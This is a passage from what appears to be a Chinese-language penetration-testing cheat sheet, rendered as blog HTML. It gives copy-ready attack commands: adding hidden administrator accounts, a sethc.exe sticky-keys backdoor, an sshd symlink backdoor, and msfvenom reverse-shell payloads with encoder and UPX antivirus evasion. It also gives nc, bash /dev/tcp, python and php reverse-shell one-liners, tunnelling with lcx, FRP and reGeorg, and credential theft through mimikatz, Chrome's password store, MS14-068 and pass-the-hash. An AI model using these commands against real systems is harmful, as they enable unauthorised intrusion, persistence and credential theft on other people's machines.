class="string">&quot;net localgroup administrator as /add&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc exp.c -o Common.exe -mwindows</span><br></pre></td></tr></table></figure><p>编译成<code>ipconfig.exe</code>丢入PATH下，执行命令即可</p><h4 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h4><p>把上面的exp编译成<code>Common.exe</code>，放在含有空格的地方等待重启即可</p><h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4><p>写入<code>restart.bat</code>里等</p><h3 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h3><h4 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h4><p>exp直接入（</p><p>先修改<code>ServUDaemon.ini</code>注册文件，直接加个用户上去，然后ftp连接加进管理员<code>hack</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site <span class="built_in">exec</span> net user hack Admin@123. /add</span><br><span class="line">quote site <span class="built_in">exec</span> net localgroup administrators hack /add</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h4><p>在用户名称后面加$即可隐藏</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hack$ 123456Pp. /add &amp;&amp; net localgroup administrators hack$ /add</span><br></pre></td></tr></table></figure><p>可去<code>管理/配置/本地用户和组/用户</code>中查看</p><h4 id="编辑注册表"><a href="#编辑注册表" class="headerlink" title="编辑注册表"></a>编辑注册表</h4><p>从注册表里导出，替换F字段的值，下次直接导入注册表即可</p><h4 id="shilft后门"><a href="#shilft后门" class="headerlink" title="shilft后门"></a>shilft后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure><p>覆盖掉粘滞快捷键即可</p><h4 id="Windows隐藏文件"><a href="#Windows隐藏文件" class="headerlink" title="Windows隐藏文件"></a>Windows隐藏文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib test.txt +s +h</span><br><span class="line">attrib test.txt -s -h -r</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>注册表启动键值、Windows启动项、Windows计划任务、sc命令创建新服务</p><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="SSHD软连接"><a href="#SSHD软连接" class="headerlink" title="SSHD软连接"></a>SSHD软连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config | grep UsePAM</span><br><span class="line"><span class="built_in">mkdir</span> /run/sshd</span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1234</span><br></pre></td></tr></table></figure><p>等</p><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><p>启动项、计划任务、SUID后门、公钥免密登陆、Strace后门、进程注入</p><h3 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编码器免杀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -b “\x00” -i 16 -f exe -o test.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw |msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o test1.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai-x /root/nppInstaller.exe -i 5 -f exe -o nppinstaller2.exe</span><br></pre></td></tr></table></figure><p>upx套壳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai –i 10 –f exe –o upxtest.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -5 upxtest.exe –k</span><br></pre></td></tr></table></figure><p>MSF开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload &lt;payload_name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;lhost_value&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT &lt;lport_value&gt;</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><p>生成二进制后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>生成web后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>生成脚本后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>生成shellcode后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>msfvenom常用的使用格式命令</p><p>普通生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p -f -o msfvenom -p windows/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>编码处理型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>捆绑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\nomal.exe -k -f exe -o C:\shell.exe</span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>PHP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>Asp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>Aspx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f aspx &gt; shell.aspx</span><br></pre></td></tr></table></figure><p>Jsp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><p>War</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=-f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><p>Perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST= LPORT= -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h3 id="其他权限维持"><a href="#其他权限维持" class="headerlink" title="其他权限维持"></a>其他权限维持</h3><p>使用msf在主机上注册一个服务，上传服务启动文件，隐藏等</p><h3 id="渗透框架"><a href="#渗透框架" class="headerlink" title="渗透框架"></a>渗透框架</h3><h4 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编写shell反弹工具，拿到shell后和稳定程序绑定</p><h2 id="内网渗透代理"><a href="#内网渗透代理" class="headerlink" title="内网渗透代理"></a>内网渗透代理</h2><h3 id="Lcx端口转发"><a href="#Lcx端口转发" class="headerlink" title="Lcx端口转发"></a>Lcx端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><p>跳板机转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portmap -m 2 -p1 3950 -h2 1.1.1.2 -p2 3951</span><br><span class="line">Lcx.exe –listen 3950 3951</span><br><span class="line">将公网服务器的3950端口监听的数据转发到3951</span><br></pre></td></tr></table></figure><p>靶机转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 1.1.1.2 3950 192.168.1.2 3389</span><br><span class="line">将靶机的3389转发到公网服务器的3950上</span><br></pre></td></tr></table></figure><h3 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C: 请求压缩所有数据</span><br><span class="line">-D: port 指定一个本地机器动态的应用程序端口转发</span><br><span class="line">-f: 要求在执行命令前退至后台</span><br><span class="line">-g: 允许远端主机连接本地转发的端口</span><br><span class="line">-L: 将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-N: 不执行远程命令. 用于转发端口.</span><br><span class="line">-R: 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br></pre></td></tr></table></figure><h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1111:192.168.1.2:80 -fN 1.1.1.2</span><br><span class="line">利用公网跳板机将192.168.1.2的80端口转发到1.1.1.2的1111端口</span><br></pre></td></tr></table></figure><h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机(1.1.1.1)---防火墙---主机B(192.168.1.2)</span><br><span class="line">     |--主机A(192.168.1.1)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1111:192.168.1.2:80 -fN 1.1.1.1</span><br><span class="line">利用内网跳板机将192.168.1.2的80端口转发到1.1.1.1的1111端口</span><br></pre></td></tr></table></figure><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机---主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 -DfNg 1.1.1.2</span><br></pre></td></tr></table></figure><p>利用<code>proxychains</code>代理即可</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c: 指定连接后要执行的shell命令</span><br><span class="line">-e: 指定连接后要执行的文件名</span><br><span class="line">-k: 配置Socker一直存活</span><br><span class="line">-l: 监听模式</span><br><span class="line">-p: 指定端口</span><br><span class="line">-u: 启动UDP协议传输</span><br><span class="line">-v: 显示指令执行过程</span><br></pre></td></tr></table></figure><h4 id="nc正向shell"><a href="#nc正向shell" class="headerlink" title="nc正向shell"></a>nc正向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1111 -e /bin/bash</span><br><span class="line">监听本地1111端口，连接成功执行/bin/bash</span><br></pre></td></tr></table></figure><h4 id="nc反向shell"><a href="#nc反向shell" class="headerlink" title="nc反向shell"></a>nc反向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.1.1.1 1111</span><br></pre></td></tr></table></figure><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$&#123;POST&#125;</span> 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="隐秘隧道搭建"><a href="#隐秘隧道搭建" class="headerlink" title="隐秘隧道搭建"></a>隐秘隧道搭建</h2><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>服务器配置</p><blockquote><p>frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000# 要绑定的端口</span><br><span class="line"></span><br><span class="line">dashboard_user = admin# 控制台的用户名</span><br><span class="line">dashboard_pwd = admin# 控制台的密码</span><br><span class="line">dashboard_port = 6500# 控制台的端口</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure><p>客户端设置</p><blockquote><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.100.101 #代理服务器ip地址</span><br><span class="line">server_port = 7000#代理服务器设置绑定的端口</span><br><span class="line"></span><br><span class="line">[rdp]# 反向代理名称</span><br><span class="line">type = tcp# 协议类型</span><br><span class="line">local_ip = 107.0.0.1 # 本机ip地址</span><br><span class="line">local_post = 3389 # 远程桌面的默认端口</span><br><span class="line">remote_post = 6005 # 对外访问的端口</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure><p><code>mstsc.exe</code>远程桌面直接连接<code>192.168.122.18:6005</code>即可</p><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><p>正向代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure><p>之后利用<code>Proxifier</code>代理即可</p><h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 192.168.122.17 -p 8080 -u http://192.168.122.18/tunnel.nosocket.php</span><br></pre></td></tr></table></figure><p>之后利用<code>Proxifier</code>代理即可，设置代理规则<code>applications</code>为<code>python.exe</code>，<code>Action</code>为<code>Direct</code></p><h2 id="内网常见攻击"><a href="#内网常见攻击" class="headerlink" title="内网常见攻击"></a>内网常见攻击</h2><h3 id="MS17-010等"><a href="#MS17-010等" class="headerlink" title="MS17-010等"></a>MS17-010等</h3><p>利用msf远程利用即可</p><h3 id="网络设备漏洞"><a href="#网络设备漏洞" class="headerlink" title="网络设备漏洞"></a>网络设备漏洞</h3><p>路由器常见漏洞</p><blockquote><p>命令执行\未授权访问\拒绝服务\自带后门</p></blockquote><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>Cobalt Strike钓鱼、Swaks配合CS钓鱼、Word&#x2F;Excel宏钓鱼、PPSX钓鱼(PPT动作特性构造)、文件名反转、重定向钓鱼、自解压等</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="常用cmd指令"><a href="#常用cmd指令" class="headerlink" title="常用cmd指令"></a>常用cmd指令</h4><blockquote><p><code>net user</code> 查看本机用户<br><code>net user /domain</code> 查看域内用户<br><code>tasklist</code> 查看当前进程<br><code>netstat -ano</code> 查看端口列表<br><code>systeminfo</code> 查看修补程序<br><code>wmic qfe list full</code> 查看补丁信息</p></blockquote><h4 id="查看域信息"><a href="#查看域信息" class="headerlink" title="查看域信息"></a>查看域信息</h4><p>计算机右键属性即可</p><h4 id="用户习惯"><a href="#用户习惯" class="headerlink" title="用户习惯"></a>用户习惯</h4><ol><li>计划任务 <code>【开始】→【管理工具】→【任务计划程序】</code></li><li>最近打开的文档 <code>C:\Users\Administrator\Recent</code></li><li>收藏夹</li><li>文件搜索</li><li>历史记录等</li></ol><h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><ol><li>mimikatz</li><li>谷歌浏览器密码库 <code>C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data</code>，使用<a href="https://github.com/pawelsalawa/sqlitestudio/releases">SQLiteStudio</a>打开等</li></ol><h3 id="域控攻击"><a href="#域控攻击" class="headerlink" title="域控攻击"></a>域控攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>漏洞利用步骤：</p><ol><li>获取SID <code>whoami /user</code></li><li>生成伪造票据 <code>ms14-086.exe -u (域用户@域) -p (域用户密码) -s (sid) -d (ac_ip)</code></li><li>删除缓存票据 <code>klist purge</code></li><li>导入票据获取域控权限 <code>kerberos::ptc 自定义命名.ccache</code></li><li>尝试列举域控C盘文件 <code>dir \\dc.really.com\c$</code></li></ol><h4 id="MS14-025"><a href="#MS14-025" class="headerlink" title="MS14-025"></a>MS14-025</h4><blockquote><p>在利用“MS14-025”漏洞开始之前需先知道利用失败或者出错可能是什么原因造成的，一般存在以下几种原因：</p><p>A．安装了GPP凭证补丁：KB2962486，这个补丁禁止在组策略配置中填入密码，补丁查询命令systeminfo查询是否有安装“KB2962486”补丁。<br>B．不在组策略中使用域控密码。<br>C．SYSVOL文件夹访问权限。<br>D．可能没使用GPP配置。</p></blockquote><p>漏洞利用步骤：</p><ol><li>判断SYSVOL文件夹访问权限。</li><li>查找XML文件。 <code>Groups.xml</code></li><li>解密XML文件中加密的密码信息。 <code>cpassword</code></li></ol><h4 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h4><p>在使用NTLM身份验证的系统或服务上，用户密码永远不会以明文形式通过网络发送。本机Windows应用程序要求用户提供明文密码，然后调用LsaLogonUser 之类的API，将该密码转换为一个或两个哈希值（LM或NT哈希），然后在NTLM身份验证期间将其发送到远程服务器。对这种机制的分析表明，成功完成网络身份验证不需要明文密码，只需要哈希即可。</p><p>如果攻击者具有用户密码的哈希值，则无需强行使用明文密码；可以简单地使用已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成的原始密码。</p><p>攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、获取NTLM Hash</span><br><span class="line">privilege::debug提升为debug权限</span><br><span class="line">sekurlsa::logonpasswords 显示最近登录过的用户和最近登录过的计算机的凭证</span><br><span class="line">2、hash传递</span><br><span class="line">sekurlsa::pth /user:用户 /domain:域 /ntlm:hash</span><br></pre></td></tr></table></figure><h4 id="Ntml-Hash获取"><a href="#Ntml-Hash获取" class="headerlink" title="Ntml Hash获取"></a>Ntml Hash获取</h4><p>利用Responder工具，（搭建SMB服务、SQL服务器、FTP、HTTP等）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Dawn_whisper\AppData\Roaming\Typora\typora-user-images\image-20220714160306097.png" alt="image-20220714160306097"></p><h3 id="域权限维持"><a href="#域权限维持" class="headerlink" title="域权限维持"></a>域权限维持</h3><ol><li>使用黄金票据</li><li>SSP权限维持</li><li>Memory Updateing of 